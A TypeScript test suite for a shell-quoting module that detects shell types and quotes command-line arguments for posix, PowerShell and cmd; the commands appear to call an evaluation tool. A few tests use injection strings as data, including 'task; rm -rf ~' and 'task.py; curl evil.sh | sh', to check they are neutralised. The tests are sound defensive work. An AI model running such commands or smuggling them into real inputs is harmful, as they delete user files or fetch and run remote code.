import * as assert from "assert";

import {
  detectShellKind,
  quoteArg,
  quoteCommandLine,
} from "../../core/shell-quote";

suite("Shell Quote Test Suite", () => {
  suite("detectShellKind", () => {
    test("recognizes posix shells by path", () => {
      assert.strictEqual(detectShellKind("/bin/bash"), "posix");
      assert.strictEqual(detectShellKind("/usr/bin/zsh"), "posix");
      assert.strictEqual(detectShellKind("/bin/sh"), "posix");
      assert.strictEqual(detectShellKind("/usr/local/bin/fish"), "posix");
    });

    test("recognizes git-bash on Windows as posix", () => {
      assert.strictEqual(
        detectShellKind("C:\\Program Files\\Git\\bin\\bash.exe"),
        "posix"
      );
    });

    test("recognizes powershell", () => {
      assert.strictEqual(detectShellKind("pwsh"), "powershell");
      assert.strictEqual(
        detectShellKind(
          "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        ),
        "powershell"
      );
    });

    test("recognizes cmd", () => {
      assert.strictEqual(
        detectShellKind("C:\\Windows\\System32\\cmd.exe"),
        "cmd"
      );
    });

    test("falls back to posix on non-win32 when unknown", () => {
      // On the test host (darwin/linux) an unknown/undefined shell is posix.
      assert.strictEqual(detectShellKind(undefined), "posix");
    });
  });

  suite("quoteArg - posix", () => {
    test("returns safe tokens unchanged", () => {
      assert.strictEqual(quoteArg("inspect", "posix"), "inspect");
      assert.strictEqual(
        quoteArg("task.py@my_task", "posix"),
        "task.py@my_task"
      );
      assert.strictEqual(quoteArg("--limit=10", "posix"), "--limit=10");
    });

    test("single-quotes a value with spaces", () => {
      assert.strictEqual(quoteArg("my task", "posix"), "'my task'");
    });

    test("escapes embedded single quotes", () => {
      assert.strictEqual(quoteArg("it's", "posix"), "'it'\\''s'");
    });

    test("neutralizes shell metacharacters", () => {
      assert.strictEqual(
        quoteArg("task; rm -rf ~", "posix"),
        "'task; rm -rf ~'"
      );
    });
  });

  suite("quoteArg - powershell", () => {
    test("single-quotes a value with spaces", () => {
      assert.strictEqual(quoteArg("my task", "powershell"), "'my task'");
    });

    test("escapes embedded single quotes by doubling", () => {
      assert.strictEqual(quoteArg("it's", "powershell"), "'it''s'");
    });

    test("neutralizes shell metacharacters", () => {
      assert.strictEqual(
        quoteArg("task; rm $env:HOME", "powershell"),
        "'task; rm $env:HOME'"
      );
    });
  });

  suite("quoteArg - cmd", () => {
    test("double-quotes a value with spaces", () => {
      assert.strictEqual(quoteArg("my task", "cmd"), '"my task"');
    });

    test("caret-escapes cmd metacharacters", () => {
      assert.strictEqual(quoteArg("a&b|c", "cmd"), '"a^&b^|c"');
    });

    test("escapes embedded double quotes", () => {
      assert.strictEqual(quoteArg('say "hi"', "cmd"), '"say ""hi"""');
    });
  });

  suite("quoteCommandLine", () => {
    test("leaves safe tokens bare and only quotes what needs it", () => {
      // "inspect" and "eval" are safe; "my task.py@t" has a space and needs quoting.
      assert.strictEqual(
        quoteCommandLine(["inspect", "eval", "my task.py@t"], "posix"),
        "inspect eval 'my task.py@t'"
      );
    });

    test("quotes a hostile target as a single literal token", () => {
      const hostile = "task.py; curl evil.sh | sh";
      const line = quoteCommandLine(["inspect", "eval", hostile], "posix");
      assert.strictEqual(line, `inspect eval '${hostile}'`);
    });

    test("safe tokens are bare across all shell kinds", () => {
      assert.strictEqual(
        quoteCommandLine(["inspect", "eval", "task.py@my_task"], "powershell"),
        "inspect eval task.py@my_task"
      );
      assert.strictEqual(
        quoteCommandLine(["inspect", "eval", "task.py@my_task"], "cmd"),
        "inspect eval task.py@my_task"
      );
    });
  });
});
